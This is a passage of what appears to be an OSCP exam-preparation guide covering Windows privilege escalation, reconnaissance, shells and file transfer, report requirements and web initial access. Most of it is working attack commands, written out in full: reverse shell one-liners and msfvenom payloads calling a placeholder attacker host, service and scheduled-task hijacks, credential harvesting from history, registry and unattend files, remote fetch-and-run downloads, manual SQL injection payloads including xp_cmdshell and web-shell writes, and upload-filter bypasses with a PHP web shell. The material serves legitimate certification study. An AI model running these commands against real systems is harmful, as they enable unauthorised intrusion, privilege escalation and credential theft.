Finding Exploit Writable service binary (BUILTIN\Users:(M)) Replace it with an msfvenom exe, restart the service Weak service permissions (you can change config) sc.exe config <svc> binpath= "C:\Windows\Temp\rev.exe" Unquoted path with spaces (C:\Program Files\My App\svc.exe) and a writable parent Drop C:\Program Files\My.exe (or My App\... prefix) Writable DLL path the service loads (ProcMon / WinPEAS) Plant an msfvenom -f dll 
# Unquoted path hunt (no wmic on new builds)
Get-CimInstance Win32_Service | ? { $_.PathName -notmatch '^"' -and $_.PathName -match ' .*\.exe' } | select Name,PathName,StartMode

# restart — needs the right to start/stop; otherwise wait for a reboot (if you have SeShutdown)
sc.exe stop <svc>; sc.exe start <svc>
Restart-Service <svc>

What to read: Access is denied on sc stop → check StartMode = Auto and whether you can shutdown /r /t 0 (SeShutdownPrivilege). Ask before rebooting in a real engagement; in the exam it costs time, not points.

docs.title: 3.6 Scheduled tasks
docs.text:
schtasks /query /fo LIST /v | findstr /i "TaskName Run.As Task.To.Run"
Get-ScheduledTask | ? {$_.Principal.UserId -notmatch 'SYSTEM|LOCAL SERVICE|NETWORK SERVICE'} | select TaskName,TaskPath
icacls C:\scripts\cleanup.ps1

What to read: a task run as an admin user / SYSTEM whose script (C:\scripts\*.ps1, .bat) you can write. Next: append a reverse shell line and wait for the next run.

docs.title: 3.7 AlwaysInstallElevated
docs.text:
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Both 0x1 → any MSI installs as SYSTEM:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f msi -o evil.msi

msiexec /quiet /qn /i C:\Windows\Temp\evil.msi

docs.title: 3.8 Stored credentials
docs.text:
Often faster than any exploit — look before you dig:

cmdkey /list                                                # saved creds → runas /savecred
runas /savecred /user:CORP\admin "C:\Windows\Temp\nc.exe <KALI> 443 -e cmd"
Get-Content (Get-PSReadlineOption).HistorySavePath          # PowerShell history (every user you can read)
type C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword"
dir C:\Windows\Panther\Unattend*.xml, C:\Windows\Panther\unattend.xml -ErrorAction SilentlyContinue
Get-ChildItem C:\Users,C:\inetpub,C:\xampp,C:\backup -Include *.config,*.xml,*.ini,*.txt,*.kdbx -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' -List

What to read: clear-text passwords, ConvertTo-SecureString lines, -Credential usage in history, base64 in unattend files, .kdbx → crack.

Next: use the creds with runas, evil-winrm, RDP, or nxc against other hosts.

docs.title: 3.9 Built-in binaries — LOLBAS
docs.text:
When an upload tool or PowerShell is blocked, LOLBAS lists signed Windows binaries that download or execute:

certutil -urlcache -split -f http://<KALI>/rev.exe C:\Windows\Temp\rev.exe   # download
bitsadmin /transfer j http://<KALI>/rev.exe C:\Windows\Temp\rev.exe            # download

Defender view: LOLBins.

docs.title: 3.10 UAC and kernel
docs.text:
• Admin but medium integrity (whoami /groups shows Medium Mandatory Level) → that's a UAC bypass, not privesc. Often simpler: if you have the admin password, log in over evil-winrm / psexec, which gives a high-integrity token directly.
  • Kernel / missing patch (from systeminfo): compare the build and hotfixes against known local privilege-escalation CVEs; last resort, may need a revert.

docs.title: 4. Common mistakes
docs.text:
• Not reading whoami /priv and spending an hour on WinPEAS output while SeImpersonate was there all along.
  • Wrong potato for the OS. JuicyPotato does not work on Server 2019 / Win10 1809+; use PrintSpoofer or GodPotato.
  • 32-bit shell on 64-bit Windows — registry and Program Files paths differ; check [Environment]::Is64BitProcess.
  • Replacing a service binary you can't restart — check start/stop rights or auto-start first.
  • Skipping other users' PowerShell history once you can read their profile.
  • Moving on without looting. The SYSTEM shell on MS01 is where the AD-set credential for MS02 lives.

docs.title: 5. Exam tips
docs.text:
• Proof screenshot: type C:\Users\Administrator\Desktop\proof.txt, whoami, ipconfig in one screenshot from an interactive shell (a web shell does not count — flag rules).
  • Keep both PrintSpoofer64.exe and GodPotato-NET4.exe (and NET35) in your tools folder.
  • Note every file you uploaded and every service / task you changed — they go in the report's clean-up section.

docs.title: Checklist
docs.text:
• whoami /priv read → potato if SeImpersonate/SeAssignPrimaryToken; SeBackup → hives
  • WinPEAS / PrivescCheck run and read
  • Services checked (writable binary, unquoted path, weak perms, DLLs)
  • Scheduled tasks checked
  • AlwaysInstallElevated keys checked
  • Stored credentials searched (cmdkey, history, registry, unattend, files)
  • systeminfo noted for missing patches (last option)
  • Host looted before moving on

docs.title: Recon & Enumeration
docs.text:
Applies to: every machine, first hour · Priority: Highest · Last updated: 2026-11-03

In one sentence

Find every open port, name every service and version, and pull everything an unauthenticated (or low-privileged) user can read — most OSCP footholds are sitting in this output, unnoticed.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: 1. Concept
docs.text:
Enumeration is two passes:

  1. Discovery — which ports are open (all 65,535 TCP, plus the common UDP ones).
  2. Interrogation — for each port: what software, what version, what does it let me see without credentials, and what does it let me see with the credentials I already have?

Output from pass 2 feeds three questions: Is there a public exploit for this version? · Is there a login I can try defaults or found creds on? · Is there data (files, users, configs) that leaks a credential?

flowchart LR
    A[nmap -p-] --> B[nmap -sC -sV<br/>on open ports]
    B --> C{per service}
    C --> D[Version → searchsploit]
    C --> E[Login → defaults / found creds]
    C --> F[Data → files, users, configs]
    D & E & F --> G[Foothold candidate list]

docs.title: 2. Main tools
docs.text:
Tool Use it for Exam status nmap (+ NSE) Port discovery, versions, default scripts Allowed (NSE explicitly) NetExec (nxc) SMB / WinRM / LDAP / MSSQL / RDP checks, null & guest sessions, shares, users Allowed smbclient Browse and download SMB shares Allowed enum4linux-ng One-shot SMB/RPC/LDAP enumeration (users, groups, policy, shares) Allowed snmpwalk / snmp-check Users, processes, installed software over SNMP Allowed showmount / mount NFS exports Allowed ftp / nc / curl Banner grabbing, anonymous FTP, raw protocol poking Allowed

Exam rule — no mass vulnerability scanners

Nessus, OpenVAS, NeXpose, Qualys and similar are banned, and so are tools that do the same job (e.g. running a template-based vuln scanner across every host). Version detection with nmap -sV, NSE scripts and searchsploit are fine — do the "is this version vulnerable?" step yourself.

docs.title: 3.1 nmap — new target, nothing known
docs.text:
Situation: A fresh IP in the control panel.

# 1) all TCP ports, fast
sudo nmap -p- --min-rate 2000 -Pn -oN nmap/all.txt $IP

# 2) scripts + versions on what is open
ports=$(grep -oP '^\d+(?=/tcp\s+open)' nmap/all.txt | paste -sd,)
sudo nmap -sC -sV -Pn -p$ports -oN nmap/svc.txt $IP

# 3) top UDP ports (SNMP, TFTP, IKE hide here)
sudo nmap -sU --top-ports 25 -Pn -oN nmap/udp.txt $IP

What to read in the output:

  • Service Info / OS lines, ssl-cert commonName, smb-os-discovery → hostnames and domain → add to /etc/hosts.
  • http-title, http-generator, http-robots.txt → app name and hidden paths.
  • ftp-anon: Anonymous FTP login allowed → log in now.
  • Unusual high ports (e.g. 8000, 8080, 8443, 9090, 5000) → second web app, admin panel, or custom service.
  • Version strings → searchsploit <product> <version>.

Next: start on the first interesting port while the UDP scan finishes. If -sV returns tcpwrapped or ?, poke it by hand: nc -nv $IP <port> and curl -i http://$IP:<port>/.

Rescan when something changes

After you get a shell or a pivot, rescan from the new vantage point. Ports filtered from Kali are often open from inside (nmap -sT -Pn through a tunnel → Pivoting).

More nmap detail: Nmap scanning · Service & NSE · Output & performance.

docs.title: 3.2 NetExec — a Windows host with SMB (445)
docs.text:
Situation: 445 is open. You want OS, domain, signing, and whether anonymous access works.

nxc smb $IP                                  # banner: name, domain, OS build, signing
nxc smb $IP -u '' -p '' --shares             # null session
nxc smb $IP -u 'guest' -p '' --shares        # guest
nxc smb $IP -u '' -p '' --users --pass-pol   # users + lockout policy (if allowed)
nxc smb $IP -u 'guest' -p '' --rid-brute     # usernames via RID cycling

What to read: (name:FILES01) (domain:corp.local) → /etc/hosts; any share with READ or WRITE; usernames (save to users.txt); Account Lockout Threshold.

Next: readable share → smbclient (below). Usernames → AS-REP roast / spray → Active Directory. Writable share → think about planting a file that makes a user connect back to you (coercion).

docs.title: 3.3 smbclient — a readable share
docs.text:
smbclient -L //$IP -N                         # list shares anonymously
smbclient //$IP/Shared -N                     # connect
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *                                # pull everything

With credentials: smbclient //$IP/Shared -U 'corp.local/user%Password1'.

What to look for in the files: *.config, web.config, *.ps1, *.bat, *.vbs (hard-coded creds), *.kdbx (KeePass → crack), *.xml from Group Policy (cpassword → gpp-decrypt), backups (*.bak, *.zip), and writable directories.

grep -RniE 'pass(word)?|pwd|secret|cred' ./loot/ 2>/dev/null

docs.title: 3.4 enum4linux-ng — one-shot SMB/RPC summary
docs.text:
Situation: You want the whole SMB/RPC picture in one run (good on Samba Linux boxes too).

enum4linux-ng -A $IP -oA loot/e4l          # anonymous
enum4linux-ng -A $IP -u user -p 'Password1'  # authenticated

What to read: Domain/Workgroup, Users (with descriptions — passwords are often left there), Groups, Password policy, Shares with Mapping: OK.

Next: descriptions with a password → try it everywhere. Samba version → searchsploit.

docs.title: 3.5 SNMP (161/UDP)
docs.text:
Situation: UDP scan shows 161/udp open snmp.

onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt $IP
snmpwalk -v2c -c public $IP | tee loot/snmp.txt
snmpwalk -v2c -c public $IP 1.3.6.1.2.1.25.4.2.1.2    # running processes
snmpwalk -v2c -c public $IP 1.3.6.1.4.1.77.1.2.25     # Windows users
snmpwalk -v2c -c public $IP NET-SNMP-EXTEND-MIB::nsExtendObjects   # extend scripts (may show creds)

What to read: process command lines with passwords, installed software versions, usernames. Next: users → login attempts; software → searchsploit.

docs.title: 3.6 NFS (2049)
docs.text:
showmount -e $IP
sudo mkdir -p /mnt/nfs && sudo mount -t nfs -o vers=3,nolock $IP:/home /mnt/nfs
ls -la /mnt/nfs

What to read: SSH keys, configs, and the export options. no_root_squash on an export you can write to is a classic Linux privesc → Linux privesc › NFS.

docs.title: 3.7 FTP, SSH, databases and the rest
docs.text:
ftp $IP                        # try anonymous / anonymous
nc -nv $IP 25                  # SMTP: VRFY / EXPN user enumeration
smtp-user-enum -M VRFY -U users.txt -t $IP
mysql -h $IP -u root -p        # blank / root / found creds
impacket-mssqlclient sa:'sa'@$IP          # MSSQL defaults
ssh -v user@$IP                # auth methods offered; version

Port reference: Well-known ports.

docs.title: 4. Common mistakes
docs.text:
• Only scanning the top 1000 ports. A web app on 8443 or a service on 50000 is the way in more often than people expect. Always -p-.
  • Skipping UDP. SNMP leaking a password or a process command line is a recurring OSCP pattern.
  • Not adding hostnames. A vhost-based site shows a default page by IP and the real app by name.
  • Waiting for scans. Start on port 80 while the full scan runs.
  • Ignoring "boring" results. An anonymous FTP with an empty-looking directory may be writable — and served by the web server.
  • Not re-enumerating with credentials. Every new credential means re-running nxc, smbclient, enum4linux-ng — the view changes.

docs.title: 5. Exam tips
docs.text:
• Keep nmap/all.txt and nmap/svc.txt per target — they go straight into the report.
  • Make a running users.txt and creds.txt per environment from the first minute.
  • If a version looks vulnerable, write the CVE and exploit path in your notes before trying it — it saves re-research after a revert.
  • NetExec output with [+] means valid credentials; (Pwn3d!) means local admin on that host.

docs.title: Reporting
docs.text:
Deadline: 24 h after the hands-on window · Last updated: 2026-10-23

In one sentence

Points only count if the report proves them — and mistakes are permanent once the VPN closes, because you cannot go back to the machines.

How this page is organised

What the report must contain, how to take notes so the report is 80% written before you start, and a submission checklist. Practising the report is part of practising the exam — see Practice labs › mock exams.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: What the report is for
docs.text: A grader reads it and must be able to reproduce every step. If they can't follow it, or a flag isn't proven, that target scores reduced or zero points — regardless of whether you actually rooted it. Treat the exam network like a client engagement and write the report you'd hand a client.

docs.title: Proof requirements (the ones that cost points)
docs.text:
• Each flag needs a screenshot showing the flag contents and the target IP in the same frame (ip addr / ifconfig / ipconfig). Two separate screenshots do not count.
  • Flags must be read from an interactive shell with cat / type, from their original location — web shells are not valid.
  • proof.txt needs the right privilege: root on Linux; SYSTEM / Administrator / local-admin on Windows.
  • Submit every flag in the control panel before the exam ends and include the screenshot in the report.

Full detail: Exam format › what makes a flag count.

docs.title: Note structure during the exam
docs.text:
One page per machine, the same sections every time — this is literally your report draft:

## Target: 192.168.x.x  (Standalone 1)
### Nmap / enumeration
### Initial access        → local.txt (screenshot: flag + IP)
### Local enumeration
### Privilege escalation   → proof.txt (screenshot: flag + IP)
### Exploit code / changes (URL, modified code, explanation)

Document everything that could be relevant, not just what worked at the time — a detail from machine 1 might unlock machine 2 an hour later, and you won't remember it unless it's written down.

docs.title: Exploit code in the report
docs.text:
• Unmodified public exploit: provide the URL only.
  • Modified exploit: include the modified code, the original URL, the shellcode / msfvenom command if any, and highlight and explain every change.

docs.title: Template and tools
docs.text:
• Official template: OSCP Exam Report (.docx) — you're strongly encouraged to use it.
  • During the exam: a note tool you're fast in — Obsidian, CherryTree, Sublime. Keep screenshots organised per machine.
  • Report automation (optional): SysReptor can speed up turning notes into the final document.

docs.title: Submission
docs.text:
Item Requirement Format One PDF, archived as .7z; scripts / PoCs as text inside the PDF (no other files in the archive) PDF name OSCP-OS-XXXXX-Exam-Report.pdf (your OSID) Archive name OSCP-OS-XXXXX-Exam-Report.7z (same OSID) — case-sensitive, must match exactly Password None on the PDF or the archive Size Max 200 MB Where / when https://upload.offsec.com, within 24 h of the hands-on window ending Verify Compare the MD5 shown after upload with your local file; re-upload if different, then click Submit File

Upload gotcha

Some candidates hit a "file is not a proper format" error uploading from Windows 11 — OffSec recommends uploading from the Kali VM. A confirmation email follows a successful upload (check spam).

docs.title: Submission checklist
docs.text:
• Every claimed flag has a proof screenshot (flag + IP, same frame)
  • Every step reproduces from the report alone
  • Modified exploits: code + original URL + explanation of changes
  • Machines in clear, separate sections (grading follows report order)
  • File names exactly OSCP-OS-XXXXX-Exam-Report.pdf / .7z
  • No password on PDF or archive; archive ≤ 200 MB
  • Uploaded to upload.offsec.com, MD5 verified, Submit File clicked
  • Confirmation email received

docs.title: Shells & File Transfer
docs.text:
Applies to: every foothold · Priority: High · Last updated: 2026-11-03

In one sentence

Turn "I can run a command" into a stable, interactive shell you can screenshot, and move your tools onto the target — with payloads you build yourself (msfvenom is always allowed) and Metasploit kept for at most one machine.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: 1. Concept
docs.text:
Three separate problems, solved in order:

  1. Get a callback — a reverse shell from the target to a listener on Kali (or a bind shell if egress is blocked).
  2. Stabilise it — a real TTY on Linux, history/arrow keys on Windows, so you don't lose the shell to Ctrl-C.
  3. Move files — upload enumeration scripts and exploits, download loot.

Exam rule — Metasploit on one target only

  • Metasploit modules (exploit / auxiliary / post) or Meterpreter: one target of your choice. Once used on a machine, the choice is locked — even if it fails.
  • Running check against several hosts to pick one counts as using it on all of them.
  • No Metasploit pivoting (autoroute, portfwd, socks module).
  • Always allowed on every target: msfvenom (any payload format) and exploit/multi/handler with a non-Meterpreter payload (e.g. windows/x64/shell_reverse_tcp).
  • Full wording → Exam format › Metasploit.

docs.title: 2. Main tools
docs.text: Tool Use it for Exam status nc / ncat + rlwrap Listeners, simple transfers Allowed msfvenom Reverse-shell payloads: exe, elf, dll, msi, aspx, war, php, raw shellcode Allowed everywhere multi/handler Catching staged / non-Meterpreter payloads Allowed with non-Meterpreter payloads python3 -m http.server Serving files from Kali Allowed impacket-smbserver SMB share on Kali (copy, run from UNC, hash capture) Allowed certutil / iwr / curl / wget Download on target (LOLBAS / GTFOBins) Allowed evil-winrm Built-in upload / download over WinRM Allowed

docs.title: 3.1 Listener and one-liners
docs.text:
Situation: You have command execution (web shell, command injection, exploit) and want a shell.

# Kali — listener on a port egress rules usually allow
rlwrap -cAr nc -lvnp 443
Linux targetWindows target 
bash -c 'bash -i >& /dev/tcp/<KALI>/443 0>&1'
# no bash /dev/tcp?
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <KALI> 443 > /tmp/f
busybox nc <KALI> 443 -e /bin/sh
python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<KALI>",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# upload nc.exe first (see 3.5), then:
C:\Windows\Temp\nc.exe <KALI> 443 -e cmd.exe
# or a msfvenom exe (3.2)
C:\Windows\Temp\rev.exe

What to read: connect to [KALI] from (UNKNOWN) [IP] → you're in. Nothing arrives? → try port 80 / 53, check that the target can reach you at all (ping, curl http://<KALI>/), or try a bind shell.

Payloads inside a URL or JSON

Base64 the payload to avoid quoting issues: echo 'bash -i >& /dev/tcp/<KALI>/443 0>&1' | base64 → echo <b64> | base64 -d | bash. On Windows: powershell -enc <UTF-16LE base64>.

docs.title: 3.2 msfvenom — build the payload you need
docs.text:
Situation: An exploit needs shellcode, a service needs a replacement binary, a Tomcat manager accepts a WAR, an upload accepts ASPX.

# Windows exe / service binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f exe -o rev.exe
# Windows DLL (DLL hijack)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f dll -o evil.dll
# MSI (AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f msi -o evil.msi
# ASPX (IIS upload)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f aspx -o rev.aspx
# WAR (Tomcat manager)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$KALI LPORT=443 -f war -o rev.war
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$KALI LPORT=443 -f elf -o rev.elf
# Shellcode for a public exploit (Python format, strip bad chars)
msfvenom -p windows/shell_reverse_tcp LHOST=$KALI LPORT=443 EXITFUNC=thread -b '\x00' -f python -v shellcode

Stageless vs staged: shell_reverse_tcp (underscore) is stageless → catch with plain nc. shell/reverse_tcp (slash) is staged → needs multi/handler:

msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST tun0; set LPORT 443; run"

Next: match the architecture (x64 vs x86 — check systeminfo / uname -m); a wrong arch just dies silently.

docs.title: 3.3 Linux — upgrade to a full TTY
docs.text:
Situation: A raw nc shell: no tab completion, sudo / su complain about a terminal, Ctrl-C kills it.

python3 -c 'import pty; pty.spawn("/bin/bash")'    # or: script -qc /bin/bash /dev/null
# press Ctrl-Z
stty raw -echo; fg
# press Enter, then:
export TERM=xterm-256color SHELL=/bin/bash
stty rows 50 cols 200          # match `stty size` on Kali

What to read: the prompt redraws properly, su prompts for a password, vi works. Next: Linux privesc.

Got SSH credentials or a key?

Use real SSH instead — it's the most stable shell, and ssh -L/-R/-D gives you pivoting for free → Pivoting › SSH. For a found key: chmod 600 id_rsa; ssh -i id_rsa user@$IP.

docs.title: 3.4 Windows — usable shell
docs.text:
• Always listen with rlwrap (history + arrow keys).
  • powershell -ep bypass from cmd to get PowerShell.
  • With creds and 5985 open, evil-winrm is the best shell → AD › evil-winrm.
  • With RDP rights: xfreerdp3 /v:$IP /u:user /p:'Pass' /dynamic-resolution /drive:share,/home/kali/exam/tools (or xfreerdp on older Kali) — the /drive option mounts a Kali folder for file transfer.

docs.title: 3.5 File transfer — Kali → target
docs.text:
# Kali: serve the tools folder
cd ~/exam/tools && python3 -m http.server 80
Linux targetWindows target 
wget http://<KALI>/linpeas.sh -O /tmp/lp.sh
curl http://<KALI>/linpeas.sh -o /tmp/lp.sh
curl http://<KALI>/linpeas.sh | sh                    # run without touching disk
# no wget/curl:
exec 3<>/dev/tcp/<KALI>/80; echo -e "GET /pspy64 HTTP/1.0\r\n\r\n" >&3; cat <&3 > /tmp/pspy   # (strip headers after)

iwr http://<KALI>/winPEASx64.exe -OutFile C:\Windows\Temp\wp.exe
certutil -urlcache -split -f http://<KALI>/nc.exe C:\Windows\Temp\nc.exe
IEX (New-Object Net.WebClient).DownloadString('http://<KALI>/PowerView.ps1')   # in-memory

SMB instead of HTTP (works when only 445 egress is allowed, and lets you run directly from the share):

impacket-smbserver share ~/exam/tools -smb2support -username k -password k

net use \\<KALI>\share /user:k k
copy \\<KALI>\share\mimikatz.exe C:\Windows\Temp\
\\<KALI>\share\winPEASx64.exe

Write to a directory you can write to: C:\Windows\Temp, C:\Users\Public, /tmp, /dev/shm.

docs.title: 3.6 File transfer — target → Kali (loot)
docs.text:
# Kali: receive with nc
nc -lvnp 9001 > loot/backup.zip

# Linux target
nc <KALI> 9001 < /var/backups/backup.zip

# Windows target → SMB share (above)
copy C:\Windows\Temp\sam.save \\<KALI>\share\
# evil-winrm session
download C:\Windows\Temp\sam.save

Verify integrity with md5sum / Get-FileHash on both ends for anything important (KeePass, registry hives).

Exam rule — don't exfiltrate for fun

Only download files you need to compromise a target, and delete them afterwards (Other rules).

docs.title: 4. Common mistakes
docs.text:
• Wrong architecture or staged payload with nc. Staged (/) payloads need multi/handler.
  • Using Meterpreter "just to stabilise" — that spends your one Metasploit target.
  • Listener on a high port that egress blocks; use 443 / 80 first.
  • Writing to a directory you can't write to (C:\ root, /root), then wondering why the download "worked" but nothing runs.
  • Forgetting -smb2support on impacket-smbserver — modern Windows refuses SMB1.
  • Losing the shell before the screenshot. Take the flag screenshot as soon as you have the interactive shell.

docs.title: 5. Exam tips
docs.text:
• Keep a tools/ folder with Windows (x64 and x86) and Linux binaries ready before the exam starts; test each one in a lab.
  • A second, backup shell (a second listener, or a scheduled re-run) saves you when the first one dies mid-privesc.
  • Note every payload command you used — msfvenom lines go in the report.

docs.title: Web & Initial Access
docs.text:
Exam weight: 10 points per standalone (local.txt) · Last updated: 2026-11-03

In one sentence

Getting the first shell on a standalone: usually a web application or an exposed service, often a public exploit that needs fixing before it runs — found by thorough content discovery and manual testing, not by automated scanners.

Practical companion

For command selection, output interpretation and failure diagnosis, use the practical field guide; for Windows/AD protocol detail, use the Impacket handbook.

docs.title: 1. Concept
docs.text:
Initial access on OSCP machines almost always falls into one of these buckets, roughly in order of how often they appear:

Bucket Typical signal Where it leads Known-vulnerable software A CMS / app / service with a version number Public exploit (searchsploit), usually needs editing Default / weak / reused credentials Admin panel, Tomcat, Jenkins, Grafana, database, SSH Authenticated feature that runs code (plugin, template, WAR deploy) Hidden content Nothing obvious on / /backup, /dev, .git/, a second vhost, an API App logic flaw Parameters that change output SQLi, LFI / path traversal, upload bypass, command injection, SSRF Client-side A "user" who opens files / visits links Malicious document / shortcut, captured NetNTLMv2

The rule of thumb: enumerate until you can explain every port, then try the cheapest idea first.

docs.title: 2. Main tools
docs.text:
Tool Use it for Exam status ffuf Fast fuzzing of paths, parameters, vhosts Allowed feroxbuster Recursive directory discovery Allowed gobuster Directory and vhost brute force (simple, stable) Allowed nikto Quick web-server misconfiguration check Allowed (named in the guide) Burp Suite Community Proxy, Repeater, Decoder, Comparer Allowed searchsploit Offline Exploit-DB search and copy Allowed whatweb / curl / browser dev tools Fingerprinting, headers, source Allowed hydra Login brute force with a known user Allowed — use sparingly → Password attacks

Exam rule — banned web tools

  • sqlmap / SQLninja and any other automatic exploitation tool — banned. Do SQLi by hand → Manual SQLi.
  • Burp Suite Pro (and other commercial tools) — banned. Burp Community is fine; its Scanner isn't there anyway.
  • Mass vulnerability scanners (Nessus, OpenVAS, Acunetix-style crawl-and-scan) — banned.
  • Features inside an allowed tool that do a banned job (e.g. an auto-exploit plugin) — also banned.

docs.title: 3.1 First look at a web port
docs.text:
Situation: 80/tcp open http Apache httpd 2.4.x (or any web port).

whatweb -a 3 http://$IP
curl -si http://$IP/ | head -30            # headers: Server, X-Powered-By, cookies, redirects
curl -s http://$IP/robots.txt
nikto -h http://$IP -o loot/nikto.txt

Then open it in the browser through Burp Community so every request is in HTTP history. Read the page source (Ctrl-U) for comments, JS file paths, API endpoints, version strings.

What to read: a redirect to a hostname (→ /etc/hosts), a CMS generator tag, X-Powered-By: PHP/7.x, nikto hits like /phpmyadmin/, /server-status, backup files, PUT allowed.

Next: CMS name + version → searchsploit. Otherwise → content discovery.

docs.title: 3.2 Content discovery — ffuf / feroxbuster / gobuster
docs.text:
Situation: The landing page gives nothing away.

feroxbuster (recursive)ffuf (flexible)gobuster (simple) 
feroxbuster -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
  -x php,txt,html,bak,zip -t 50 -o loot/ferox.txt

ffuf -u http://$IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -e .php,.txt,.bak -fc 404 -o loot/ffuf.json

gobuster dir -u http://$IP -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -x php,txt,bak -o loot/gobuster.txt

What to read: 200 and 301 on unexpected names (/admin, /dev, /backup, /uploads, /api), 403 on directories (fuzz inside them), files like config.php.bak, .git/HEAD, .env.

Next:

  • /.git/ exposed → dump it (git-dumper http://$IP/.git loot/git) and read history for credentials.
  • /uploads/ exists → look for the upload form that writes there.
  • Login page → defaults, then the app's documentation for default creds.

Filter by size, not just status

Many apps return 200 for everything. Run once, note the size of the junk response, then add -fs <size> (ffuf) or --filter-size <size> (feroxbuster).

docs.title: 3.3 Virtual hosts / subdomains
docs.text:
Situation: nmap or a redirect revealed a domain such as site.local.

ffuf -u http://$IP -H "Host: FUZZ.site.local" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <default_size>
# or
gobuster vhost -u http://site.local --append-domain \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

Next: add each hit (dev.site.local) to /etc/hosts and repeat 3.1–3.2 on it — dev vhosts often run an older, vulnerable build.

docs.title: 3.4 Known software → searchsploit
docs.text:
Situation: You identified Product X 2.3.1.

searchsploit product x 2.3
searchsploit -x 49876          # read it
searchsploit -m 49876          # copy to the current directory

Also search the web: "Product X 2.3.1" exploit, CVE-XXXX-YYYY poc github.

Before running any public exploit:

  1. Read it. What does it send, what does it expect back, does it need authentication?
  2. Fix it. Target URL / port / path, LHOST / LPORT, Python 2 → 3 (print, bytes vs str), SSL verification, hard-coded paths.
  3. Replace any embedded shellcode with your own msfvenom output → Shells & file transfer.
  4. Note every change for the report (exam rule).

What to read when it fails: run it with a proxy (proxies={'http':'http://127.0.0.1:8080'} in Python) and watch the request in Burp — usually the path or a CSRF token is wrong.

docs.title: 3.5 Burp Suite Community — manual testing workflow
docs.text:
Situation: You found a form or parameter and want to test it by hand.

  1. Proxy → HTTP history → right-click the request → Send to Repeater (Ctrl-R).
  2. Change one thing at a time; compare responses (length, error, timing) — use Comparer for subtle diffs.
  3. Use Decoder for base64 / URL encoding of payloads.
  4. Intruder in Community is throttled — for wordlist fuzzing of a parameter use ffuf with the request saved from Burp:
# save the request from Burp to req.txt, put FUZZ where the payload goes
ffuf -request req.txt -request-proto http -w /usr/share/seclists/Fuzzing/special-chars.txt -mr 'error|syntax'

docs.title: 3.6 SQL injection — manual only
docs.text:
Situation: A parameter (?id=1, a login form, a search box) behaves differently with a quote.

Detect:

id=1'                      → SQL error?          (error-based possible)
id=1 AND 1=1-- -  vs  id=1 AND 1=2-- -   → different page?   (boolean)
id=1' AND SLEEP(5)-- -     → 5 s delay?          (time-based, MySQL)
id=1'; WAITFOR DELAY '0:0:5'-- -                 (time-based, MSSQL)

Login bypass: admin' -- - or ' OR 1=1-- - in the username.

UNION extraction (MySQL example):

id=1 ORDER BY 1-- -        … increase until error → N columns
id=-1 UNION SELECT 1,2,3-- -                       → which column is reflected?
id=-1 UNION SELECT 1,@@version,database()-- -
id=-1 UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
id=-1 UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
id=-1 UNION SELECT 1,group_concat(username,':',password),3 FROM users-- -

From SQLi to a shell:

DBMS Technique Requires MySQL UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/c.php' FILE privilege, writable web root, secure_file_priv empty MSSQL '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- - then '; EXEC xp_cmdshell 'powershell -c ...'-- - sysadmin, stacked queries MSSQL '; EXEC master..xp_dirtree '\\<KALI>\share'-- - Any login → captures the service account's NetNTLMv2 on your impacket-smbserver PostgreSQL '; COPY (SELECT '') TO PROGRAM 'id > /tmp/o'-- - superuser

Next: dumped hashes → Password attacks; credentials → try them on SSH / admin panel / SMB.

Exam rule

sqlmap is banned — including "just for detection". Keep your own payload notes per DBMS; the table above is a starting point.

docs.title: 3.7 File upload → reverse shell
docs.text:
Situation: An upload form (profile picture, document import, plugin upload).

  1. Upload a harmless file and find where it lands (response, page source, /uploads/, feroxbuster).
  2. Try a minimal web shell: <?php system($_GET['c']); ?> as shell.php.
  3. If blocked, bypass the filter one variable at a time:
    • extension: .phtml, .php5, .phar, .pHp, shell.php.jpg, shell.jpg.php
    • Content-Type: image/png in Burp
    • magic bytes: start the file with GIF89a;
    • upload an .htaccess with AddType application/x-httpd-php .evil, then shell.evil
    • IIS: .aspx, .asp, .config; Tomcat: a WAR via the manager
  4. Confirm execution: curl "http://$IP/uploads/shell.php?c=id".
  5. Upgrade to a reverse shell (the web shell is not enough for the flag screenshot):
